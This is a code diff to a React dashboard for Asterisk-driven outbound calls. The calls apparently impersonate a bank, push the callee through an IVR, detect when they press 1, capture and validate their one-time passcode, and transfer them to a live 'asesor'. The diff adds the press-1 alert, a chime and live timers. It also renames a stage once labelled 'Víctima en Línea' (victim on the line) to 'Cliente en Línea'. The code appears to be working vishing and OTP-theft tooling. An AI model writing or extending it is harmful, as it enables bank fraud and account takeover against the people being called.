@@ -8,6 +8,7 @@ import {
   ShieldAlert,
   ShieldCheck,
   Radio,
+  BellRing,
   CheckCircle2,
   CheckCircle,
   XCircle,
@@ -607,13 +608,36 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     number: string;
     name?: string;
     service: string;
-    status: 'dialing' | 'ringing' | 'in_ivr' | 'otp_captured' | 'transferred' | 'ended';
+    status: 'dialing' | 'ringing' | 'in_ivr' | 'pressed_1' | 'otp_captured' | 'transferred' | 'connected' | 'ended';
     capturedOtp?: string;
     otpStatus?: 'valid' | 'invalid' | 'pending';
     validationNote?: string;
     duration: number;
     channel?: string;
+    pressed1Time?: string;
+    pressed1At?: number;
+    startedAt?: number;
+    answeredAt?: number;
+    agentExten?: string;
   } | null>(null);
+
+  // Audio tone generator for Press 1 detection chime
+  const playPress1Chime = () => {
+    try {
+      const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = 'sine';
+      osc.frequency.setValueAtTime(587.33, audioCtx.currentTime); // D5
+      osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.12); // A5
+      gain.gain.setValueAtTime(0.35, audioCtx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.45);
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      osc.stop(audioCtx.currentTime + 0.45);
+    } catch (_) {}
+  };
 
   // History of captured OTPs
   const [otpRecords, setOtpRecords] = useState<CapturedOtpRecord[]>([]);
@@ -994,7 +1018,31 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     return () => clearInterval(chanInterval);
   }, [selectedService, activeCall?.isActive, activeCall?.channel, activeCall?.number, activeCall?.duration, activeCall?.status]);
 
-  // Monitoreo en tiempo real del estado de la llamada activa (Corte de cliente y Contestadora automática / Buzón)
+  // Check if there is an active call running on Asterisk on mount
+  useEffect(() => {
+    fetch('/api/asterisk/call/latest-active')
+      .then((res) => res.json())
+      .then((data) => {
+        if (data.success && data.call && (!activeCallRef.current || !activeCallRef.current.isActive)) {
+          const c = data.call;
+          setActiveCall({
+            isActive: true,
+            number: c.number,
+            name: undefined,
+            service: selectedService || 'bank',
+            status: c.status === 'pressed_1' ? 'pressed_1' : (c.status || 'in_ivr'),
+            channel: c.channel,
+            duration: c.duration || 0,
+            pressed1At: c.pressed1At,
+            pressed1Time: c.pressed1At ? new Date(c.pressed1At).toLocaleTimeString() : undefined,
+            agentExten: c.agent || '1001',
+          });
+        }
+      })
+      .catch(() => {});
+  }, []);
+
+  // Monitoreo en tiempo real del estado de la llamada activa (Corte, Contestadora, y Detección de DTMF 1)
   useEffect(() => {
     if (!activeCall?.isActive || activeCall.status === 'ended') return;
 
@@ -1006,7 +1054,39 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         const data = await res.json();
         if (data.success && data.call) {
           const callState = data.call;
-          if (callState.status === 'machine') {
+
+          // 1. Detección en vivo de cuando el cliente presiona la tecla 1
+          if (callState.status === 'pressed_1' || callState.digit === '1') {
+            setActiveCall((prev) => {
+              if (!prev) return null;
+              if (prev.status !== 'pressed_1') {
+                playPress1Chime();
+              }
+              return {
+                ...prev,
+                status: 'pressed_1',
+                pressed1At: callState.pressed1At || prev.pressed1At || Date.now(),
+                pressed1Time: prev.pressed1Time || new Date(callState.pressed1At || Date.now()).toLocaleTimeString(),
+                duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
+                channel: callState.channel || prev.channel,
+              };
+            });
+          } else if (callState.status === 'transferred') {
+            setActiveCall((prev) => {
+              if (!prev) return null;
+              return {
+                ...prev,
+                status: 'transferred',
+                agentExten: callState.agent || prev.agentExten || '1001',
+                duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
+                channel: callState.channel || prev.channel,
+              };
+            });
+          } else if (callState.status === 'in_ivr' && (activeCall.status === 'dialing' || activeCall.status === 'ringing')) {
+            setActiveCall((prev) => prev ? { ...prev, status: 'in_ivr', answeredAt: callState.answeredAt || Date.now(), channel: callState.channel || prev.channel } : null);
+          } else if (callState.status === 'ringing' && activeCall.status === 'dialing') {
+            setActiveCall((prev) => prev ? { ...prev, status: 'ringing', channel: callState.channel || prev.channel } : null);
+          } else if (callState.status === 'machine') {
             setActiveCall((prev) =>
               prev
                 ? {
@@ -1027,12 +1107,24 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     ...prev,
                     isActive: false,
                     status: 'ended',
+                    duration: typeof callState.duration === 'number' && callState.duration > 0 ? callState.duration : prev.duration,
                   }
                 : null
             );
             setLaunchFeedback({
               text: `📞 El cliente ha colgado la llamada (${activeCall.number}). Llamada finalizada en el sistema.`,
-              type: 'error',
+              type: 'info',
+            });
+          }
+
+          // Mantener sincronizado el contador de tiempo de duración real reportado por Asterisk
+          if (typeof callState.duration === 'number' && callState.duration > 0) {
+            setActiveCall((prev) => {
+              if (!prev) return null;
+              if (Math.abs(prev.duration - callState.duration) >= 2) {
+                return { ...prev, duration: callState.duration };
+              }
+              return prev;
             });
           }
         }
@@ -1578,25 +1670,80 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
       {/* ACTIVE CALL REAL-TIME HUD (Appears when a call is running) */}
       {activeCall && activeCall.isActive && (
-        <div className="p-6 rounded-2xl bg-slate-950 border-2 border-emerald-500/50 shadow-2xl relative overflow-hidden animate-fadeIn">
-          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4">
+        <div className={`p-6 rounded-2xl bg-slate-950 border-2 shadow-2xl relative overflow-hidden animate-fadeIn ${
+          activeCall.status === 'pressed_1'
+            ? 'border-amber-400 ring-4 ring-amber-400/30 shadow-amber-500/20'
+            : 'border-emerald-500/50 shadow-emerald-500/10'
+        }`}>
+          {/* Ambient background glow */}
+          <div className="absolute -top-24 -right-24 w-80 h-80 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />
+          {activeCall.status === 'pressed_1' && (
+            <div className="absolute -top-20 -left-20 w-80 h-80 bg-amber-500/25 rounded-full blur-3xl pointer-events-none animate-pulse" />
+          )}
+
+          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4 relative z-10">
             <div className="flex items-center gap-3">
-              <div className="p-3 rounded-xl bg-emerald-500/20 text-emerald-400 animate-pulse">
-                <Radio className="w-6 h-6" />
+              <div className={`p-3 rounded-2xl ${
+                activeCall.status === 'pressed_1'
+                  ? 'bg-amber-500 text-slate-950 shadow-lg shadow-amber-500/50 animate-bounce'
+                  : 'bg-emerald-500/20 text-emerald-400 animate-pulse border border-emerald-500/30'
+              }`}>
+                {activeCall.status === 'pressed_1' ? (
+                  <BellRing className="w-6 h-6 animate-spin" />
+                ) : (
+                  <Radio className="w-6 h-6" />
+                )}
               </div>
               <div>
-                <div className="flex items-center gap-2">
-                  <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
-                    LLAMADA EN PROCESO
+                <div className="flex flex-wrap items-center gap-2">
+                  <span className={`text-xs font-black px-2.5 py-1 rounded-full border flex items-center gap-1.5 shadow ${
+                    activeCall.status === 'pressed_1'
+                      ? 'bg-amber-400 text-slate-950 border-amber-300 font-extrabold animate-pulse'
+                      : activeCall.status === 'transferred'
+                      ? 'bg-sky-500/20 text-sky-300 border-sky-500/40 font-bold'
+                      : activeCall.status === 'in_ivr'
+                      ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
+                      : activeCall.status === 'ringing'
+                      ? 'bg-amber-500/20 text-amber-300 border-amber-500/40 font-bold'
+                      : 'bg-slate-800 text-slate-300 border-slate-700'
+                  }`}>
+                    <span className={`w-2 h-2 rounded-full ${
+                      activeCall.status === 'pressed_1'
+                        ? 'bg-slate-950 animate-ping'
+                        : 'bg-emerald-400 animate-ping'
+                    }`} />
+                    {activeCall.status === 'pressed_1'
+                      ? '¡CLIENTE MARCÓ 1!'
+                      : activeCall.status === 'transferred'
+                      ? 'CONECTADO CON ASESOR'
+                      : activeCall.status === 'in_ivr'
+                      ? 'CLIENTE EN LÍNEA (IVR)'
+                      : activeCall.status === 'ringing'
+                      ? 'TIMBRANDO EN TELÉFONO'
+                      : 'MARCANDO POR TRONCAL'}
                   </span>
-                  <span className="text-xs text-slate-400 font-mono">{formatTime(activeCall.duration)}</span>
+
+                  {/* PROMINENT LIVE DURATION TIMER */}
+                  <div className="flex items-center gap-1.5 px-3 py-1 rounded-xl bg-slate-900 border border-emerald-500/40 shadow-inner">
+                    <Clock className="w-4 h-4 text-emerald-400 animate-pulse" />
+                    <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Duración:</span>
+                    <span className="text-base font-black font-mono text-emerald-300 tracking-wider">
+                      {formatTime(activeCall.duration)}
+                    </span>
+                  </div>
                 </div>
-                <h3 className="text-lg font-black text-white mt-1">
-                  {activeCall.number} {activeCall.name && `(${activeCall.name})`}
+
+                <h3 className="text-xl font-black text-white mt-1.5 flex items-center gap-2">
+                  <span>{activeCall.number}</span>
+                  {activeCall.name && <span className="text-sm font-normal text-slate-400">({activeCall.name})</span>}
                 </h3>
-                <p className="text-xs text-slate-400">
-                  Servicio activo: <strong className="text-emerald-300">{activeCall.service}</strong>
-                </p>
+                <div className="flex flex-wrap items-center gap-3 text-xs text-slate-400 mt-0.5">
+                  <span>Servicio: <strong className="text-emerald-300">{activeCall.service}</strong></span>
+                  <span>•</span>
+                  <span>Troncal: <strong className="text-sky-300">{activeCarrier}</strong></span>
+                  <span>•</span>
+                  <span>CallerID: <strong className="text-slate-200">"{callerIdName}" &lt;{callerIdNum}&gt;</strong></span>
+                </div>
               </div>
             </div>
 
@@ -1605,16 +1752,16 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <button
                 id="btn-hud-transfer-agent"
                 onClick={handleTransferToAgent}
-                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
+                className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl text-xs font-black bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
               >
                 <PhoneForwarded className="w-3.5 h-3.5" />
-                <span>Pasar a Asesor (1001)</span>
+                <span>Pasar a Asesor ({activeCall.agentExten || '1001'})</span>
               </button>
 
               <button
                 id="btn-hud-hangup"
                 onClick={handleHangupActiveCall}
-                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 transition-all"
+                className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl text-xs font-bold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 transition-all"
               >
                 <PhoneOff className="w-3.5 h-3.5" />
                 <span>Colgar Llamada</span>
@@ -1623,59 +1770,172 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <button
                 id="btn-hud-close-test"
                 onClick={() => setActiveCall(null)}
-                className="inline-flex items-center gap-1.5 px-2.5 py-2 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
+                className="inline-flex items-center gap-1.5 px-2.5 py-2.5 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
                 title="Cerrar este panel visual de llamada"
               >
                 <X className="w-3.5 h-3.5" />
-                <span>Cerrar Panel</span>
               </button>
             </div>
           </div>
 
-          {/* Real-time Call Stages Flow */}
-          <div className="grid grid-cols-2 md:grid-cols-4 gap-2 my-5 text-center text-xs">
+          {/* Real-time Call Stages Flow: 5 Steps */}
+          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-2 my-5 text-center text-xs">
+            {/* Paso 1: Marcando */}
             <div
-              className={`p-3 rounded-xl border ${
+              className={`p-3 rounded-xl border transition-all ${
                 activeCall.status === 'dialing'
-                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
+                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse ring-2 ring-emerald-500/40'
                   : 'bg-slate-900 border-slate-800 text-slate-400'
               }`}
             >
-              <div className="text-[10px] font-mono uppercase">Paso 1</div>
-              <div>Marcando por Troncal</div>
+              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 1</div>
+              <div className="font-semibold mt-0.5">Marcando Troncal</div>
+              <div className="text-[10px] text-slate-500 mt-1">Conectando SIP</div>
             </div>
 
+            {/* Paso 2: Timbrando */}
             <div
-              className={`p-3 rounded-xl border ${
+              className={`p-3 rounded-xl border transition-all ${
                 activeCall.status === 'ringing'
-                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
+                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse ring-2 ring-emerald-500/40'
+                  : activeCall.status !== 'dialing'
+                  ? 'bg-slate-900/60 border-emerald-500/30 text-slate-300'
                   : 'bg-slate-900 border-slate-800 text-slate-400'
               }`}
             >
-              <div className="text-[10px] font-mono uppercase">Paso 2</div>
-              <div>Timbrando en Teléfono</div>
+              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 2</div>
+              <div className="font-semibold mt-0.5">Timbrando en Teléfono</div>
+              <div className="text-[10px] text-slate-500 mt-1">Sonando destino</div>
             </div>
 
+            {/* Paso 3: Víctima en Línea */}
             <div
-              className={`p-3 rounded-xl border ${
+              className={`p-3 rounded-xl border transition-all ${
                 activeCall.status === 'in_ivr'
-                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
+                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse ring-2 ring-emerald-500/40'
+                  : activeCall.status === 'pressed_1' || activeCall.status === 'otp_captured' || activeCall.status === 'transferred'
+                  ? 'bg-slate-900/60 border-emerald-500/30 text-slate-300'
                   : 'bg-slate-900 border-slate-800 text-slate-400'
               }`}
             >
-              <div className="text-[10px] font-mono uppercase">Paso 3</div>
-              <div>Víctima en Línea (IVR)</div>
+              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 3</div>
+              <div className="font-semibold mt-0.5">Cliente en Línea (IVR)</div>
+              <div className="text-[10px] text-slate-500 mt-1">Escuchando locución</div>
             </div>
 
+            {/* Paso 4: Cliente Presionó 1 / Captura */}
             <div
-              className={`p-3 rounded-xl border ${
-                activeCall.status === 'otp_captured'
+              className={`p-3 rounded-xl border transition-all ${
+                activeCall.status === 'pressed_1'
+                  ? 'bg-amber-500/30 border-amber-400 text-amber-200 font-black animate-pulse ring-4 ring-amber-400/50 shadow-lg shadow-amber-500/30 scale-105'
+                  : activeCall.status === 'otp_captured'
                   ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold shadow-lg shadow-emerald-500/20'
+                  : activeCall.status === 'transferred'
+                  ? 'bg-slate-900/60 border-amber-500/30 text-amber-300'
                   : 'bg-slate-900 border-slate-800 text-slate-400'
               }`}
             >
-              <div className="text-[10px] font-mono uppercase">Paso 4</div>
-              <div>Código Capturado</div>
+              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 4</div>
+              <div className="font-bold mt-0.5 flex items-center justify-center gap-1">
+                {activeCall.status === 'pressed_1' ? (
+                  <>
+                    <BellRing className="w-3.5 h-3.5 text-amber-400 animate-spin" />
+                    <span className="text-amber-300 font-extrabold">¡PRESIONÓ 1!</span>
+                  </>
+                ) : (
+                  <span>Respuesta DTMF (1 / OTP)</span>
+                )}
+              </div>
+              <div className="text-[10px] text-slate-500 mt-1">
+                {activeCall.pressed1Time ? `Detectado ${activeCall.pressed1Time}` : 'Esperando entrada del cliente'}
+              </div>
+            </div>
+
+            {/* Paso 5: Conectado Asesor */}
+            <div
+              className={`p-3 rounded-xl border transition-all ${
+                activeCall.status === 'transferred'
+                  ? 'bg-sky-500/25 border-sky-400 text-sky-200 font-black ring-4 ring-sky-400/50 shadow-lg shadow-sky-500/30 animate-pulse'
+                  : 'bg-slate-900 border-slate-800 text-slate-400'
+              }`}
+            >
+              <div className="text-[10px] font-mono uppercase text-slate-400">Paso 5</div>
+              <div className="font-semibold mt-0.5">Asesor en Línea</div>
+              <div className="text-[10px] text-slate-500 mt-1">Ext. {activeCall.agentExten || '1001'} (X-Lite)</div>
+            </div>
+          </div>
+
+          {/* BANNER GIGANTE Y ALERTA: CLIENTE PRESIONÓ 1 */}
+          {activeCall.status === 'pressed_1' && (
+            <div className="p-5 rounded-2xl bg-gradient-to-r from-amber-950/90 via-amber-900/50 to-slate-950 border-2 border-amber-400 shadow-2xl shadow-amber-500/30 animate-fadeIn my-4">
+              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
+                <div className="flex items-center gap-4">
+                  <div className="w-16 h-16 rounded-2xl bg-amber-400 text-slate-950 flex flex-col items-center justify-center font-black shadow-lg shadow-amber-400/50 animate-bounce">
+                    <span className="text-3xl leading-none">1</span>
+                    <span className="text-[9px] uppercase tracking-wider font-extrabold">DTMF</span>
+                  </div>
+                  <div>
+                    <div className="flex items-center gap-2">
+                      <span className="px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider bg-amber-400 text-slate-950 flex items-center gap-1 shadow">
+                        <BellRing className="w-3 h-3 animate-spin" />
+                        ¡TECLA 1 PRESIONADA EN VIVO!
+                      </span>
+                      <span className="text-xs text-amber-200 font-mono font-bold">
+                        {activeCall.pressed1Time ? `Detectado a las ${activeCall.pressed1Time}` : '¡Justo en este instante!'}
+                      </span>
+                    </div>
+                    <h3 className="text-lg font-black text-white mt-1">
+                      El cliente ha marcado la tecla 1 en su teléfono
+                    </h3>
+                    <p className="text-xs text-amber-200/90 max-w-xl mt-0.5">
+                      Asterisk detectó la marcación DTMF 1. La llamada se está transfiriendo inmediatamente a tu extensión de Asesor (<strong>Ext. {activeCall.agentExten || '1001'}</strong> / Softphone X-Lite). ¡Listo para conversar con el cliente!
+                    </p>
+                  </div>
+                </div>
+
+                <div className="flex flex-col sm:flex-row items-center gap-2">
+                  <button
+                    id="btn-hud-press1-talk"
+                    onClick={handleTransferToAgent}
+                    className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-black text-xs bg-amber-400 hover:bg-amber-300 text-slate-950 transition-all shadow-lg shadow-amber-400/40 animate-pulse"
+                  >
+                    <PhoneCall className="w-4 h-4" />
+                    <span>Conectar con Softphone (1001)</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Live Call Signal & Telemetry Strip */}
+          <div className="p-3 rounded-xl bg-slate-900/80 border border-slate-800 flex flex-wrap items-center justify-between gap-3 text-xs mb-4">
+            <div className="flex items-center gap-3">
+              <div className="flex items-center gap-1.5 text-emerald-400 font-mono font-bold">
+                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
+                <span>CANAL ACTIVO:</span>
+              </div>
+              <span className="font-mono text-slate-300 bg-slate-950 px-2 py-0.5 rounded border border-slate-800">
+                {activeCall.channel || `PJSIP/${activeCarrier}`}
+              </span>
+            </div>
+
+            {/* Audio wave simulation bars indicating real audio transmission */}
+            <div className="flex items-center gap-2">
+              <span className="text-slate-400 text-[11px] font-mono">Audio ULAW 8kHz:</span>
+              <div className="flex items-end gap-1 h-4">
+                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-3" />
+                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-4" style={{ animationDelay: '150ms' }} />
+                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-2" style={{ animationDelay: '300ms' }} />
+                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-4" style={{ animationDelay: '450ms' }} />
+                <span className="w-1 bg-emerald-400 rounded-full animate-pulse h-3" style={{ animationDelay: '200ms' }} />
+              </div>
+            </div>
+
+            <div className="flex items-center gap-2 font-mono">
+              <span className="text-slate-400 text-[11px]">Tiempo en curso:</span>
+              <strong className="text-emerald-300 font-black text-sm bg-slate-950 px-2.5 py-0.5 rounded border border-emerald-500/30">
+                {formatTime(activeCall.duration)}
+              </strong>
             </div>
           </div>
 
